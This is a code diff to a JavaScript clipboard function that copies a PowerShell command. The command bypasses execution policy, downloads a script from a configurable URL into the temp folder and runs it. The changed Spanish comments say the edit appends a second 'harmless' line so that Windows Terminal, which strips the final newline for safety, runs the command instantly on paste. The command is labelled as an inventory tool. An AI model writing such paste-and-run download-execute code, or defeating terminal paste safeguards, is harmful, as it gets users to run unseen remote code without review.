@@ -66,8 +66,9 @@ function copyScript(btn) {
     const urlHttps = btn.getAttribute('data-url-https');
     const urlHttp = btn.getAttribute('data-url-http');
     
-    // The \r\n\r\n ensures PowerShell flushes the buffer and auto-executes the command upon pasting
-    const command = `Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $u1='${urlHttps}'; $u2='${urlHttp}'; try { iwr $u1 -OutFile $env:TEMP\\i.ps1 -TimeoutSec 5 } catch { iwr $u2 -OutFile $env:TEMP\\i.ps1 }; if (Test-Path $env:TEMP\\i.ps1) { & $env:TEMP\\i.ps1 }\r\n\r\n`;
+    // Windows Terminal a menudo intercepta y elimina el último salto de línea por seguridad.
+    // Al agregar una segunda línea inofensiva al final, obligamos a la consola a ejecutar la primera línea de manera instantánea.
+    const command = `Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $u1='${urlHttps}'; $u2='${urlHttp}'; try { iwr $u1 -OutFile $env:TEMP\\i.ps1 -TimeoutSec 5 } catch { iwr $u2 -OutFile $env:TEMP\\i.ps1 }; if (Test-Path $env:TEMP\\i.ps1) { & $env:TEMP\\i.ps1 }\r\nWrite-Host "Ejecutando Inventario GOLD..."\r\n`;
     
     navigator.clipboard.writeText(command).then(() => {
         const originalHtml = btn.innerHTML;
